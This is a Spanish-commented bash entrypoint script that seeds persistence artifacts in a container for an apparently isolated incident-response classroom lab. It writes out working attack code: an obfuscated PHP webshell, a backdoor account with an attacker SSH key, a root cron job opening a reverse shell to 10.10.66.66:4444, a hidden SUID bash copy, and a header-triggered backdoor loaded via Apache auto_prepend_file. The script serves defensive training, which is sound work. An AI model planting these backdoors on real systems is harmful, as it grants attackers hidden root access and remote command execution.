#!/bin/bash
# seed-incidente.sh — siembra la persistencia del incidente al arrancar el contenedor.
# Artefactos de PRÁCTICA para la VLAN aislada de xest. No es malware que se propague:
# la webshell solo ejecuta lo que se le pide por parámetro y el "reverse shell" del cron
# apunta a una IP de laboratorio que no existe fuera del aula.
set -e

WEBROOT=/var/www/html

# --- Puerta 1 · webshell en el webroot -----------------------------------------
mkdir -p "$WEBROOT/assets"
cat > "$WEBROOT/assets/.cache.php" <<'PHP'
<?php
// .cache.php — artefacto de laboratorio (webshell). Persistencia dejada por el atacante.
$fn = base64_decode('c3lzdGVt');           // "system"
if (isset($_REQUEST['c'])) { $fn($_REQUEST['c']); }
PHP
chown www-data:www-data "$WEBROOT/assets/.cache.php"

# --- Puerta 2 · usuario de servicio backdoor + clave SSH del atacante ----------
if ! id svc-backup >/dev/null 2>&1; then
  useradd -m -u 1000 -s /bin/bash svc-backup
fi
mkdir -p /home/svc-backup/.ssh
cat > /home/svc-backup/.ssh/authorized_keys <<'KEY'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHe4tt4ck3rKeyxestLABONLYaaaaaaaaaaaaaaaaaaaa attacker@he-lab
KEY
chown -R svc-backup:svc-backup /home/svc-backup/.ssh
chmod 700 /home/svc-backup/.ssh
chmod 600 /home/svc-backup/.ssh/authorized_keys

# --- Puerta 3 · cron con reverse shell hacia la IP del atacante -----------------
cat > /etc/cron.d/apache-metrics <<'CRON'
# apache-metrics — artefacto de laboratorio (persistencia por tarea programada)
*/5 * * * * root bash -c 'bash -i >& /dev/tcp/10.10.66.66/4444 0>&1'
CRON
chmod 644 /etc/cron.d/apache-metrics

# --- Puerta 4 · copia SUID de bash oculta en /tmp ------------------------------
cp /bin/bash /tmp/.x
chmod 4755 /tmp/.x

# --- Puerta 5 · SOLO en INCIDENTE_NIVEL=2 (reto): persistencia por configuración -
# No aparece en los IoC de HE-E14: se caza revisando la config de Apache, no el webroot.
if [ "${INCIDENTE_NIVEL:-1}" = "2" ]; then
  cat > /usr/local/lib/.apache-init.php <<'PHP'
<?php
// artefacto de laboratorio: se dispara con la cabecera HTTP X-Metrics
if (isset($_SERVER['HTTP_X_METRICS'])) { system($_SERVER['HTTP_X_METRICS']); }
PHP
  cat > /etc/apache2/conf-enabled/zz-metrics.conf <<'CONF'
# zz-metrics.conf — persistencia por configuración (auto_prepend_file fuera del webroot)
<Directory /var/www/html>
    php_admin_value auto_prepend_file /usr/local/lib/.apache-init.php
</Directory>
CONF
fi

exec "$@"
